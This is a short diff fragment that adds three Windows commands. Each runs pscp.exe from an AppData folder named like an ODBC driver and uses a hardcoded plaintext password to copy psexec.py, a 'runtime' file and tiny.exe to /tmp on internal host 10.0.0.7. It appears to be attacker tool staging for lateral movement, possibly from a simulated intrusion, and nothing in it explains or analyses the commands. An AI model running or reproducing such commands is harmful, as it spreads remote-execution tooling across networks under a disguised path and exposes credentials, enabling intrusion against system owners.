@@ -1,0 +1,3 @@
+C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "79a&LbjM@MlW8XZa" C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\psexec.py kmitnick@10.0.0.7:/tmp/psexec.py;
+C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "79a&LbjM@MlW8XZa" C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\runtime kmitnick@10.0.0.7:/tmp/runtime;
+C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "79a&LbjM@MlW8XZa" C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\tiny.exe kmitnick@10.0.0.7:/tmp/tiny;
